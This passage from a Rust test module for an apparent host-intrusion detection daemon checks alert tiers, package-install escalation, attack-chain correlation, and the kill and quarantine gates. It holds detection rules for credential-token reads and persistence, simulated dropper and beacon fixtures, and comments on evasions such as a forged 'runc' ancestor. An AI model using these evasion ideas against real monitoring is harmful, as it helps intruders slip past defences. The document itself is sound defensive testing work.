        let parent = no_such_proc("e-sh2", 4_200_000, "/usr/bin/no-such-shell");

        let f = signal_finding(&actor, &parent, "/tmp/moat-tier-test-no-such-dir/build.sh");
        let id = d.emit(f).expect("recorded");
        let a = d.find_alert(&id).unwrap();

        assert!(
            !a.severity_reason.contains("container inspection is off")
                || !a.severity_reason.contains("never downgraded"),
            "the reason may not both escalate and demote: {}",
            a.severity_reason
        );
    }

    /// The advertised contract, in userspace: "Moat never blocks anything
    /// inside a container either way" is what the Settings screen says. The
    /// kernel half has been true since the policy split; the userspace half
    /// was never written, so a userland rule armed with `set mode enforce
    /// --rule X` could SIGKILL into somebody else's process tree.
    /// A forged ancestor must not buy an enforcement exemption.
    ///
    /// `ancestry_looks_containerised` matches basenames, and naming a file
    /// `runc` needs no privilege, no container and no docker access. It may
    /// quieten a BADGE; it may never stop a kill. One such ancestor would
    /// otherwise cover every descendant at once, which is why `all()` over the
    /// triggers is no defence against it.
    #[test]
    fn a_forged_runtime_ancestor_does_not_stop_a_kill() {
        let dir = tempfile::tempdir().unwrap();
        let (d, _) = dev_daemon(dir.path());

        let actor = no_such_proc("e-fake", 4_500_100, "/usr/bin/no-such-payload");
        // The sensor said nothing; only the NAME suggests a container.
        assert_eq!(actor.in_container, None);
        let fake = no_such_proc("e-fake-runc", 4_500_000, "/home/dan/tmp/runc");
        let mut f = signal_finding(&actor, &fake, "/tmp/moat-tier-test-no-such-dir/x");
        f.request_kill = true;
        f.ancestry = vec![fake.clone()];

        // The DISPLAY answer is yes -- that is the fallback doing its job.
        assert!(d.containerised(&f.proc, &f.ancestry), "the badge may believe this");
        // The ENFORCEMENT answer is no.
        assert!(
            !d.containerised_for_enforcement(&f.proc),
            "a name is not evidence a kernel produced"
        );
    }

    #[test]
    fn a_userland_kill_is_refused_across_a_namespace_boundary() {
        let dir = tempfile::tempdir().unwrap();
        let (d, _) = dev_daemon(dir.path());

        let mut actor = no_such_proc("e-c", 4_400_100, "/usr/bin/no-such-payload");
        // The SENSOR's answer: only this may stop an action.
        actor.in_container = Some(true);
        let parent = no_such_proc("e-runc2", 4_400_000, "/usr/bin/runc");
        let mut f = signal_finding(&actor, &parent, "/tmp/moat-tier-test-no-such-dir/x");
        f.request_kill = true;
        f.ancestry = vec![parent.clone()];

        assert!(!d.maybe_enforce(&mut f), "a container process must not be killed");
        assert!(
            f.extra_evidence.iter().any(|e| e.contains("namespace boundary")),
            "and the refusal says why: {:?}",
            f.extra_evidence
        );
    }

    /// The other half of the pair. moat's sandbox is bwrap and leaves no
    /// container runtime in the ancestry; a `docker build` leaves runc and
    /// containerd-shim. A `cargo build` inside a container is pkg-install too,
    /// and on 2026-09-08 the sandbox exemption put one on the badge with the
    /// container switch off.
    #[test]
    fn a_package_install_inside_a_real_container_is_still_quietened() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.cfg.thresholds.dedupe_secs = 0;

        let actor = no_such_proc("e-cargo", 4_300_100, "/usr/bin/no-such-cargo");
        // A real container runtime in the chain is what separates this from
        // the sandbox: `runc` is in CONTAINER_RUNTIMES, `bwrap` is not.
        let parent = no_such_proc("e-runc", 4_300_000, "/usr/bin/runc");

        let mut f = signal_finding(&actor, &parent, "/tmp/moat-tier-test-no-such-dir/x");
        f.ancestry = vec![parent.clone()];
        let id = d.emit(f).expect("recorded");
        let a = d.find_alert(&id).unwrap();
        assert_eq!(
            a.surface, "timeline",
            "a container build is watched, not asked about: {}",
            a.severity_reason
        );
    }

    #[test]
    fn a_signal_rule_is_recorded_at_full_severity_and_never_reaches_the_badge() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.cfg.thresholds.dedupe_secs = 0;
        let actor = no_such_proc("e-drop", 4_100_100, "/usr/bin/no-such-dropper");
        let parent = no_such_proc("e-sh", 4_100_000, "/usr/bin/no-such-shell");

        let id = d
            .emit(signal_finding(&actor, &parent, "/tmp/moat-tier-test-no-such-dir/x"))
            .expect("a signal rule still records an alert");
        let a = d.find_alert(&id).unwrap();

        assert_eq!(a.tier, "signal", "the tier is on the record (CONTRACT §4)");
        assert_eq!(a.severity, "high", "the tier does NOT move the severity");
        assert_eq!(a.surface, "timeline", "and it never reaches the badge on its own");
        assert_eq!(a.suppressed_by, None, "a signal rule is not a suppression");
        assert!(a.is_building_block());
        assert!(a.incident.is_none(), "no snapshot for a building block");
        assert_eq!(
            d.store.unacked()["high"],
            0,
            "and nothing about it is waiting for a person"
        );
        assert!(
            a.explain.evidence.iter().any(|e| e.starts_with("tier: ")),
            "the alert says why it is on the timeline: {:?}",
            a.explain.evidence
        );

        // The ledger names it, so "recorded" can be read as "how much of this
        // is scaffolding".
        let l = d.store.ledger();
        assert_eq!(l.needs_you, 0);
        assert_eq!(l.recorded, 1);
        assert_eq!(l.signal, 1);
        assert_eq!(l.suppressed, 0);
        assert_eq!(d.status()["ledger"]["signal"], 1);
        assert_eq!(d.status()["triage_pending"], 0, "not a question, not queued");
    }

    /// The noise guard counts what a person can be asked about, and a `signal`
    /// row is not that.
    ///
    /// Before the tier existed this was the ONLY mechanism that could say "this
    /// rule is a building block", and it said it by demoting — so the seven
    /// building-block rules spent their lives tripping a circuit breaker,
    /// raising a `moat-x-noisy-rule` alert each time, and being re-demoted
    /// after every 24 h of quiet. Declaring the tier ends the cycle rather than
    /// making it cheaper.
    #[test]
    fn the_noise_guard_never_counts_a_signal_rule() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.cfg.thresholds.dedupe_secs = 0;
        d.baseline.noisy_rule_per_day = 2;
        let actor = no_such_proc("e-drop", 4_100_100, "/usr/bin/no-such-dropper");
        let parent = no_such_proc("e-sh", 4_100_000, "/usr/bin/no-such-shell");
        for i in 0..20 {
            let _ = d.emit(signal_finding(
                &actor,
                &parent,
                &format!("/tmp/moat-tier-test-no-such-dir/x{}", i),
            ));
        }
        assert!(
            d.baseline.demoted_rules().is_empty(),
            "a rule that declared itself a building block cannot also be 'too noisy'"
        );
        assert!(
            !d.store.load().iter().any(|a| a.rule == crate::rules::NOISY_RULE),
            "and no noise complaint is raised about it"
        );
    }

    /// The product's thesis, as a test: a `/tmp` exec is a building block on a
    /// developer's machine and a DETECTION inside a package install.
    ///
    /// This is the one cell where a `signal` rule reaches the badge on its own,
    /// and it is the exact shape that went to the timeline on 2026-09-04 — a
    /// package `preinstall` that downloaded a binary into `/tmp` and ran it,
    /// while the rule sat demoted because `cargo test` trips the same rule all
    /// day.
    #[test]
    fn a_signal_rule_inside_a_package_install_is_a_detection() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.cfg.thresholds.dedupe_secs = 0;
        // A real ancestry, because the context comes from the process table.
        // `node` rather than `sh`, so `moat-pkg-subtree-interpreter-spawn` does
        // not also fire and make this test about two rules.
        d.handle_line(&exec_line("e-npm", 4_200_000, "/usr/bin/npm", "install", ""));
        d.handle_line(&exec_line("e-node", 4_200_001, "/usr/bin/node", "install.js", "e-npm"));
        let actor = d.table.get("e-node").expect("the table has it").clone();
        let parent = d.table.get("e-npm").expect("the table has it").clone();

        let id = d
            .emit(signal_finding(&actor, &parent, "/tmp/moat-tier-test-no-such-dir/stage2"))
            .expect("the alert");
        let a = d.find_alert(&id).unwrap();
        assert_eq!(a.context, crate::context::Context::PkgInstall);
        assert!(a.pkg_install_escalation, "the matrix escalated it, and the record says so");
        assert_eq!(a.severity, "high");
        assert_eq!(
            a.surface, "alerts",
            "a /tmp exec inside an install IS a detection: {}",
            a.severity_reason
        );
        assert!(!a.is_building_block(), "so it is not treated as one anywhere");
        assert_eq!(d.store.unacked()["high"], 1);
        assert_eq!(d.store.ledger().needs_you, 1);
    }

    /// A demotion may never move a package-install escalation to the timeline.
    ///
    /// The 2026-09-04 miss, closed in general rather than for one path. The
    /// noise guard is arithmetic about how often a shape fires ON THIS MACHINE;
    /// that is not evidence about what a package install did, and the two must
    /// not be allowed to cancel out. Asserted against the retroactive half
    /// (`quieten_backlog`), which is the half that reaches back over records
    /// already on disk.
    #[test]
    fn a_demotion_never_quietens_a_package_install_escalation() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.cfg.thresholds.dedupe_secs = 0;
        d.baseline.noisy_rule_per_day = 2;
        d.handle_line(&exec_line("e-npm", 4_200_000, "/usr/bin/npm", "install", ""));
        d.handle_line(&exec_line("e-node", 4_200_001, "/usr/bin/node", "install.js", "e-npm"));
        let actor = d.table.get("e-node").unwrap().clone();
        let parent = d.table.get("e-npm").unwrap().clone();

        // One pattern, flooded past the threshold. Every one of these is a
        // package-install escalation, so every one is on the badge.
        let mut ids = Vec::new();
        for i in 0..6 {
            ids.push(
                d.emit(signal_finding(
                    &actor,
                    &parent,
                    &format!("/tmp/moat-tier-test-no-such-dir/stage{}", i),
                ))
                .unwrap(),
            );
        }
        assert!(
            d.baseline
                .demoted_rules()
                .contains(&"moat-exec-untrusted-tmpfs".to_string()),
            "precondition: the shape was demoted"
        );
        for id in &ids {
            let a = d.find_alert(id).unwrap();
            assert_eq!(
                a.surface, "alerts",
                "alert {} was escalated by the pkg-install matrix and must stay on the badge",
                id
            );
        }
    }

    /// `chain::Observation.silenced` reads `suppressed_by` and nothing else, so
    /// a `signal` step is a full trigger — which is the entire reason the tier
    /// is safe to declare.
    ///
    /// The lab AUR attack was caught by `moat-exec-untrusted-tmpfs` appearing
    /// in a chain. That rule is now `signal`, so if declaring the tier cost it
    /// its place in a sequence, this change would have traded 14,859 quiet rows
    /// for the one detection that has ever mattered here.
    #[test]
    fn a_signal_step_is_still_a_chain_trigger_and_a_high_chain_still_reaches_the_badge() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.cfg.thresholds.dedupe_secs = 0;
        let actor = no_such_proc("e-drop", 4_100_100, "/usr/bin/no-such-dropper");
        let parent = no_such_proc("e-mk", 4_100_000, "/usr/bin/no-such-makepkg");

        let a = d
            .emit(signal_finding(&actor, &parent, "/tmp/moat-tier-test-no-such-dir/helper"))
            .expect("the signal step");
        assert_eq!(d.find_alert(&a).unwrap().surface, "timeline", "precondition");

        // A second family in the same tree.
        let mut m = crate::policy::PolicyMeta::fallback("moat-x-pkg-egress");
        m.family = "net".into();
        m.severity = "medium".into();
        let mut f = Finding::new("moat-x-pkg-egress", m, actor.clone());
        f.hook = "file_post_open".into();
        f.hook_detail = Some("read".into());
        f.ancestry = vec![parent.clone()];
        f.file = Some(crate::alert::FileRef {
            path: "/tmp/moat-tier-test-no-such-dir/beacon".into(),
            sha256: None,
        });
        let b = d.emit(f).expect("the egress step");

        let chain = d.find_alert(&a).unwrap().chain.expect("the two must correlate");
        assert_eq!(d.find_alert(&b).unwrap().chain.map(|c| c.id), Some(chain.id.clone()));
        assert!(
            chain.steps.iter().all(|s| s.is_trigger()),
            "a signal tier must not turn a step into context"
        );
        assert!(
            crate::alert::severity_rank(&chain.severity) >= 2,
            "chain is {} with a high signal trigger in it",
            chain.severity
        );
        assert_eq!(
            d.find_alert(&a).unwrap().surface,
            "alerts",
            "and a high chain re-stamps its trigger onto the badge"
        );
    }

    // ------------------------------------------- the kill gate and quarantine

    /// Put a finished alert straight into the store, so a chain can be built
    /// over facts (rarity, family, path) the test chooses.
    fn stored_alert(
        d: &mut Daemon,
        id: &str,
        rule: &str,
        family: &str,
        path: &str,
        rarity: crate::rarity::Rarity,
    ) -> Alert {
        let mut a = crate::alert::tests_support::demo_alert(id);
        a.rule = rule.into();
        a.family = family.into();
        a.severity = "high".into();
        a.rarity = rarity;
        a.file = Some(crate::alert::FileRef { path: path.into(), sha256: None });
        a.process.pid = 4_300_000 + (id.len() as u32);
        d.store.append_alert(&a).unwrap();
        a
    }

    fn chain_over(d: &Daemon, alerts: &[Alert], severity: &str) -> crate::chain::Chain {
        let steps: Vec<crate::chain::Step> = alerts
            .iter()
            .map(|a| crate::chain::Step {
                alert: a.id.clone(),
                ts: a.ts.clone(),
                family: a.family.clone(),
                rule: a.rule.clone(),
                severity: a.severity.clone(),
                title: a.title.clone(),
                pid: a.process.pid,
                exe: a.process.exe.clone(),
                role: "trigger".into(),
            })
            .collect();
        let _ = d;
        let mut families: Vec<String> = alerts.iter().map(|a| a.family.clone()).collect();
        families.sort();
        families.dedup();
        crate::chain::Chain {
            v: 1,
            id: "01CHAINQUARANTINE".into(),
            ancestor: crate::alert::Ancestor::new(4_299_999, "/usr/bin/no-such-makepkg".into()),
            families,
            severity: severity.into(),
            severity_base: "high".into(),
            severity_reason: "r".into(),
            first_ts: util::now_rfc3339(),
            last_ts: util::now_rfc3339(),
            span_secs: 1,
            steps_total: steps.len(),
            triggers_total: steps.len(),
            members: steps.iter().map(|s| s.alert.clone()).collect(),
            steps,
            truncated: false,
            summary: "s".into(),
        }
    }

    fn decisions(d: &Daemon) -> Vec<Value> {
        let path = d.cfg.paths.state_dir.join("decisions.jsonl");
        std::fs::read_to_string(path)
            .unwrap_or_default()
            .lines()
            .filter_map(|l| serde_json::from_str(l).ok())
            .collect()
    }

    /// Quarantine passes the kill gate, and says so when it refuses.
    ///
    /// On 2026-09-05 at 22:03Z a `critical` chain raised by this project's own
    /// `cargo test` run made the daemon try to quarantine
    /// `…/target/release/moatctl` — the developer's build output — and it
    /// failed only because the mount was read-only. The kill gate had already
    /// looked at chains of that shape and refused them; quarantine had no gate
    /// at all. Moving a file aside is not the gentle option, so it is the same
    /// decision, recorded in the same words.
    #[test]
    fn a_chain_the_kill_gate_would_spare_is_not_quarantined_either() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.cfg.contain.enabled = true;

        // Real files, under the tempdir (which is under /tmp, one of the roots
        // quarantine will act in). They must still exist afterwards.
        let build_output = dir.path().join("target-release-moatctl");
        let unit = dir.path().join("some.service");
        std::fs::write(&build_output, b"ELF-ish").unwrap();
        std::fs::write(&unit, b"[Unit]").unwrap();

        // One novel family and one the machine has seen: exactly the shape the
        // kill gate spares, and exactly a developer's build.
        let a = stored_alert(
            &mut d,
            "01QA0000000000000000000000",
            "moat-exec-untrusted-tmpfs",
            "exec",
            &build_output.to_string_lossy(),
            crate::rarity::Rarity::FirstSeen,
        );
        let b = stored_alert(
            &mut d,
            "01QB0000000000000000000000",
            "moat-persist-autostart-write",
            "persist",
            &unit.to_string_lossy(),
            crate::rarity::Rarity::Common,
        );
        let c = chain_over(&d, &[a.clone(), b.clone()], "high");
        d.quarantine_chain_artifacts(&c);

        assert!(build_output.exists(), "the developer's build output is still there");
        assert!(unit.exists());
        assert_eq!(d.find_alert(&a.id).unwrap().action_taken, "none");
        let refusals: Vec<Value> = decisions(&d)
            .into_iter()
            .filter(|r| r["verdict"] == "quarantine_spared")
            .collect();
        assert_eq!(refusals.len(), 1, "the refusal is a record, not a log line");
        assert!(
            refusals[0]["reason"]
                .as_str()
                .unwrap()
                .contains("this machine has seen this shape before"),
            "the same sentence the kill gate prints: {}",
            refusals[0]["reason"]
        );
    }

    /// A mixed chain acts on the HOST half only.
    ///
    /// `chain_gate` decides whether the chain may act at all; it says nothing
    /// about what it aims at. One host trigger permits a mixed chain, and
    /// `tree_targets` then returned every trigger pid including the
    /// containerised ones -- so a container build step could be killed because
    /// something on the host in the same tree looked bad. The permit and the
    /// aim are different questions and only the first was being asked.
    #[test]
    fn a_mixed_chain_aims_only_at_its_host_steps() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        let host = stored_alert(&mut d, "01QG0000000000000000000000", "moat-exec-untrusted-home",
                                "exec", "/tmp/no-such-host", crate::rarity::Rarity::FirstSeen);
        let cont = stored_alert(&mut d, "01QH0000000000000000000000", "moat-persist-autostart-write",
                                "persist", "/tmp/no-such-cont", crate::rarity::Rarity::FirstSeen);
        // Distinct pids: `stored_alert` derives one from the id LENGTH, and
        // both ids are 26 characters, so without this both steps are pid
        // 4300026 and the assertion below cannot tell them apart. It could not,
        // on the first attempt.
        let (mut host, mut cont) = (host, cont);
        host.process.pid = 4_600_001;
        cont.process.pid = 4_600_002;
        for (al, v) in [(&host, Some(false)), (&cont, Some(true))] {
            let mut stored = d.find_alert(&al.id).unwrap();
            stored.process.in_container = v;
            stored.process.pid = al.process.pid;
            d.store.append_alert(&stored).unwrap();
        }
        let c = chain_over(&d, &[host.clone(), cont.clone()], "critical");

        // The chain may act: one of its steps is on this machine.
        let v = d.chain_gate(&c).verdict;
        assert!(
            v.as_ref().err().map(|e| !e.contains("namespace boundary")).unwrap_or(true),
            "a mixed chain is not refused as containerised: {:?}",
            v
        );

        // The PRODUCTION filter, called -- not a copy of it.
        //
        // The first version of this test reimplemented the filter in its own
        // body and asserted on that, so deleting the real one changed nothing
        // and the mutation check was checking the test. Driving
        // `maybe_kill_tree` end to end does not work either: `refuse_to_kill`
        // spares every target because these pids do not exist, so nothing is
        // ever recorded. `host_targets` is the seam that is both real and
        // reachable.
        let kept: Vec<u32> = d
            .host_targets(
                crate::contain::tree_targets(&c.steps, c.ancestor.pid, false),
                &c.id,
            )
            .into_iter()
            .map(|t| t.pid)
            .collect();
        assert!(kept.contains(&host.process.pid), "the host step is still a target: {:?}", kept);
        assert!(
            !kept.contains(&cont.process.pid),
            "the container step must not be killed: {:?}",
            kept
        );
    }

    /// Nor is a container's file quarantined off this machine's disk.
    ///
    /// The fourth destination of `may_act_on`. A path named by a container step
    /// is namespace-relative, so moving `/app/server` would move a HOST file
    /// that merely shares the name -- and quarantine is the one action with a
    /// visible, immediate cost to the user.
    #[test]
    fn a_container_named_file_is_not_quarantined_off_the_host() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.cfg.contain.enabled = true;
        d.homes = vec![dir.path().to_string_lossy().to_string()];

        // A real host file whose path a container step also names.
        let victim = dir.path().join("server");
        std::fs::write(&victim, b"HOST BINARY").unwrap();

        // Two families, or the gate refuses and nothing is quarantined for a
        // reason that has nothing to do with namespaces -- which is how the
        // first version of this test passed while proving nothing.
        let mut a = stored_alert(&mut d, "01QK0000000000000000000000", "moat-exec-untrusted-home",
                                 "exec", &victim.to_string_lossy(),
                                 crate::rarity::Rarity::FirstSeen);
        a.process.in_container = Some(true);
        d.store.append_alert(&a).unwrap();
        let b = stored_alert(&mut d, "01QL0000000000000000000000", "moat-persist-autostart-write",
                             "persist", &dir.path().join("no-such-file").to_string_lossy(),
                             crate::rarity::Rarity::FirstSeen);
        let c = chain_over(&d, &[a.clone(), b.clone()], "critical");

        d.quarantine_chain_artifacts(&c);
        assert!(victim.exists(), "a container step moved a host file off the disk");
        assert_eq!(std::fs::read(&victim).unwrap(), b"HOST BINARY");

        // Control: the SAME chain with that step on the host DOES move it.
        // Without this the assertion above passes whenever quarantine declines
        // for any unrelated reason.
        let mut host = d.find_alert(&a.id).unwrap();
        host.process.in_container = Some(false);
        d.store.append_alert(&host).unwrap();
        d.quarantine_chain_artifacts(&c);
        assert!(
            !victim.exists(),
            "the fixture cannot quarantine at all, so the assertion above is vacuous"
        );
    }

    /// A container step must not decide what the HOST may not connect to.
    ///
    /// The generated containment policy is scoped to the host namespace, which
    /// decides where it applies -- not whether the evidence for it came from
    /// this machine. A containerised step naming `/usr/bin/curl` would install
    /// a policy refusing HOST curl to that destination: an unprivileged
    /// container choosing what the host may not reach. The path is
    /// namespace-relative and names a different file over there.
    #[test]
    fn a_container_step_does_not_name_the_binary_the_host_is_blocked_from_using() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.cfg.contain.enabled = true;

        let mut a = stored_alert(&mut d, "01QJ0000000000000000000000", "moat-net-first-contact",
                                 "net", "", crate::rarity::Rarity::FirstSeen);
        a.process.exe = "/usr/bin/curl".into();
        a.process.in_container = Some(true);
        a.net = Some(crate::alert::NetRef {
            dst_ip: "203.0.113.9".into(),
            dst_port: 443,
            domain: None,
            domain_age_secs: None,
            domain_cname: None,
                domain_queried_by: None,
            });
        d.store.append_alert(&a).unwrap();
        let c = chain_over(&d, &[a.clone()], "critical");

        // `host_net_members`, not `maybe_contain`: the policy load needs a live
        // sensor, so `contain.live()` is empty in a test either way and
        // asserting on it proves nothing. This is the seam that decides WHAT a
        // containment would be built from.
        assert!(
            d.host_net_members(&c).is_empty(),
            "a container's evidence would have built a host policy: {:?}",
            d.host_net_members(&c)
        );

        // And the same chain on the host DOES yield evidence, or the assertion
        // above would pass for want of a destination rather than for the reason
        // it claims.
        let mut host = d.find_alert(&a.id).unwrap();
        host.process.in_container = Some(false);
        d.store.append_alert(&host).unwrap();
        assert_eq!(
            d.host_net_members(&c).len(),
            1,
            "the identical host chain must still be containable"
        );
    }

    /// The chain path owns containment, tree kills and quarantine -- the three
    /// actions that hit a whole process tree. It must refuse across a namespace
    /// boundary, and it must refuse only when EVERY trigger is over there.
    ///
    /// A chain can span both sides: a container step beside a host step is what
    /// a build that also touches the host looks like. Refusing on the first
    /// container member would let one such step veto enforcement for the host
    /// half -- so an attacker able to start a container (no privilege beyond
    /// docker access) could disarm containment for their real, host-side
    /// activity by making sure one container event joined the chain.
    #[test]
    fn the_chain_gate_refuses_a_container_but_not_a_chain_that_merely_touches_one() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        let a = stored_alert(&mut d, "01QE0000000000000000000000", "moat-exec-untrusted-home",
                             "exec", "/tmp/no-such-a", crate::rarity::Rarity::FirstSeen);
        let b = stored_alert(&mut d, "01QF0000000000000000000000", "moat-persist-autostart-write",
                             "persist", "/tmp/no-such-b", crate::rarity::Rarity::FirstSeen);
        let c = chain_over(&d, &[a.clone(), b.clone()], "critical");

        // Precondition: with both on the host this shape passes the gate.
        assert!(d.chain_gate(&c).verdict.is_ok(), "precondition: the gate would act");

        // Stated on the STORED alert, because that is where chain_gate reads
        // it: `exec_id` is serde(skip), so an alert loaded back from the store
        // can never be matched against the process table at all.
        let contain_both = |d: &mut Daemon, v: Option<bool>| {
            for al in [&a, &b] {
                let mut stored = d.find_alert(&al.id).unwrap();
                stored.process.in_container = v;
                d.store.append_alert(&stored).unwrap();
            }
        };
        contain_both(&mut d, Some(true));

        // The REASON, not merely a refusal. Asserting `is_err()` alone passes
        // with the whole guard deleted: re-appending the alerts moves the
        // gate's own verdict for unrelated reasons, so only the message tells
        // this refusal apart from any other.
        let why = d
            .chain_gate(&c)
            .verdict
            .expect_err("a wholly containerised chain must be refused");
        assert!(
            why.contains("namespace boundary"),
            "refused, but not for being in a container: {}",
            why
        );

        // A TRUNCATED chain earns no exemption, even with every visible step in
        // a container: `steps` is capped at 12 and the members past the cap
        // have no role, so "every trigger" can only mean "every trigger moat
        // still has". A later host trigger can sit outside it, and an exemption
        // granted on partial evidence is a hiding place.
        {
            let mut cut = c.clone();
            cut.truncated = true;
            let v = d.chain_gate(&cut).verdict;
            assert!(
                v.as_ref().err().map(|e| !e.contains("namespace boundary")).unwrap_or(true),
                "a truncated chain must not be exempted as containerised: {:?}",
                v
            );
        }

        // An UNRESOLVABLE trigger earns no exemption either. A step whose
        // alert is gone is not evidence that it ran in a container; without the
        // completeness check, `filter_map` would silently drop it and `all()`
        // would answer about a smaller set than the chain actually has.
        {
            let mut ghost = c.clone();
            let mut phantom = ghost.steps[0].clone();
            phantom.alert = "01ZZZZZZZZZZZZZZZZZZZZZZZZ".into();
            ghost.steps.push(phantom);
            let v = d.chain_gate(&ghost).verdict;
            assert!(
                v.as_ref().err().map(|e| !e.contains("namespace boundary")).unwrap_or(true),
                "a chain with an unresolvable trigger must not be exempted: {:?}",
                v
            );
        }

        // Now put ONE of them back on the host: the host half stays actionable.
        let mut host = d.find_alert(&a.id).unwrap();
        host.process.in_container = Some(false);
        d.store.append_alert(&host).unwrap();
        let after = d.chain_gate(&c).verdict;
        assert!(
            after.as_ref().err().map(|e| !e.contains("namespace boundary")).unwrap_or(true),
            "one host step keeps the chain actionable; otherwise a container step is a veto: {:?}",
            after
        );
    }

    /// ...and a chain that WOULD be killed is quarantined, so the gate is a
    /// gate and not an off switch.
    #[test]
    fn a_chain_that_would_kill_does_quarantine() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.cfg.contain.enabled = true;
        let dropper = dir.path().join("browser-helper");
        std::fs::write(&dropper, b"ELF-ish").unwrap();

        let a = stored_alert(
            &mut d,
            "01QC0000000000000000000000",
            "moat-exec-untrusted-home",
            "exec",
            &dropper.to_string_lossy(),
            crate::rarity::Rarity::FirstSeen,
        );
        let b = stored_alert(
            &mut d,
            "01QD0000000000000000000000",
            "moat-persist-autostart-write",
            "persist",
            &dir.path().join("no-such-file").to_string_lossy(),
            crate::rarity::Rarity::FirstSeen,
        );
        let c = chain_over(&d, &[a.clone(), b.clone()], "critical");
        assert!(
            crate::contain::worth_killing_for(
                &c.severity,
                &[
                    crate::contain::StepFact { family: "exec".into(), novel: true, pid: 1 },
                    crate::contain::StepFact { family: "persist".into(), novel: true, pid: 2 },
                ]
            )
            .is_ok(),
            "precondition: this is a shape the kill gate passes"
        );
        d.quarantine_chain_artifacts(&c);
        assert!(!dropper.exists(), "the dropped binary was moved aside");
        assert_eq!(d.find_alert(&a.id).unwrap().action_taken, "quarantined");
    }

    /// A `signal` step's file is not taken on a `high` chain.
    ///
    /// A signal rule is right about what it saw and weak about what it means,
    /// and `moat-exec-untrusted-tmpfs` names the binary a build just produced
    /// hundreds of times a day. Acting on the file a weak rule pointed at, on a
    /// correlation that only reached `high`, is the one shape where moat can
    /// destroy work while being technically correct about every step.
    #[test]
    fn a_signal_steps_file_is_only_quarantined_when_the_chain_is_critical() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        d.cfg.contain.enabled = true;
        let built = dir.path().join("test-binary");

        for (severity, must_survive) in [("high", true), ("critical", false)] {
            std::fs::write(&built, b"ELF-ish").unwrap();
            let mut a = stored_alert(
                &mut d,
                &format!("01QE{:022}", severity.len()),
                "moat-exec-untrusted-tmpfs",
                "exec",
                &built.to_string_lossy(),
                crate::rarity::Rarity::FirstSeen,
            );
            // The declaration, on the record.
            a.tier = crate::policy::TIER_SIGNAL.into();
            d.store.append_alert(&a).unwrap();
            let b = stored_alert(
                &mut d,
                &format!("01QF{:022}", severity.len()),
                "moat-persist-autostart-write",
                "persist",
                &dir.path().join("no-such-file").to_string_lossy(),
                crate::rarity::Rarity::FirstSeen,
            );
            let c = chain_over(&d, &[a.clone(), b], severity);
            d.quarantine_chain_artifacts(&c);
            assert_eq!(
                built.exists(),
                must_survive,
                "a {} chain and a signal step: file should {}",
                severity,
                if must_survive { "survive" } else { "be taken" }
            );
        }
    }

    /// A rule that is on and cannot fire must say so.
    #[test]
    fn rules_needing_process_cred_are_reported_as_inert_without_it() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _cfg) = dev_daemon(dir.path());

        // Point at a conf.d of our own. Reading the real /etc made this pass
        // only on a machine where the fragment was absent -- it failed the
        // moment the fix was actually deployed, which is the worst possible
        // time for a test to change its mind.
        let confd = dir.path().join("conf.d");
        std::fs::create_dir_all(&confd).unwrap();
        d.cfg.paths.export_allowlist = confd.join("export-allowlist");
        d.cfg.rules.exec_memfd = true;
        d.cfg.rules.exec_privileges_raised = true;

        let inert = d.inert_rules();
        assert_eq!(inert.len(), 2, "no fragment: both rules are inert, {:?}", inert);
        assert!(inert.iter().any(|r| r.contains("memfd")), "{:?}", inert);

        // And with the flag actually enabled, nothing is inert.
        std::fs::write(confd.join("enable-process-cred"), "true\n").unwrap();
        assert!(d.inert_rules().is_empty(), "the fragment makes both rules live");

        // Anything other than `true` is not enabled -- a fragment someone set
        // to `false` must not read as working.
        std::fs::write(confd.join("enable-process-cred"), "false\n").unwrap();
        assert_eq!(d.inert_rules().len(), 2, "false is not true");

        // Switching a rule off is not the same as it being broken: nothing to
        // report, because nothing is claiming to watch.
        d.cfg.rules.exec_memfd = false;
        d.cfg.rules.exec_privileges_raised = false;
        assert!(d.inert_rules().is_empty(), "a rule that is off is not inert");
    }

    /// The counterpart: an alert the *user* allowlisted is still context, so
    /// the fix above did not quietly turn the allowlist into a chain trigger.
    #[test]
    fn an_allowlisted_alert_is_still_only_context() {
        let dir = tempfile::tempdir().unwrap();
        let (mut d, _) = dev_daemon(dir.path());
        std::fs::write(
            d.cfg.paths.allowlist_dir.join("user.toml"),
            "[[rule]]\nname = \"moat-cred-project-token-read\"\n",
        )
        .unwrap();
        d.reload_allowlist();

        let node = ProcInfo {
            exec_id: "e-node".into(),
            pid: 1_876_167,
            uid: 1000,
            exe: "/usr/bin/node".into(),
            args: String::new(),
            cwd: "/tmp/lab".into(),
            start_time: util::now_rfc3339(),
            parent_exec_id: None,
            exited_at: None,
            exit_signal: None,
            exe_note: None,
            in_container: None,
            sid: None,
            tty: None,
            ..Default::default()
        };
        let finding = |rule: &str, family: &str, severity: &str, path: &str| {
            let mut f = Finding::new(rule, crate::policy::PolicyMeta::fallback(rule), node.clone());
            f.meta.family = family.into();
            f.meta.severity = severity.into();
            f.hook = "file_post_open".into();
            f.file = Some(crate::alert::FileRef { path: path.into(), sha256: None });
            f
        };
        let a = d
            .emit(finding("moat-persist-git-config-write", "persist", "high", "/tmp/lab/.git/config"))
            .unwrap();
        d.emit(finding("moat-cred-project-token-read", "cred", "medium", "/tmp/lab/.env"))
            .unwrap();

        let pa = d.store.load().into_iter().find(|x| x.id == a).unwrap();
        assert!(
            pa.chain.is_none(),
            "an allowlisted second family must not create a chain"
        );
        assert_eq!(d.status()["chains_formed"], 0);
    }

    /// The correlator must never merge two unrelated trees. Replaying the same
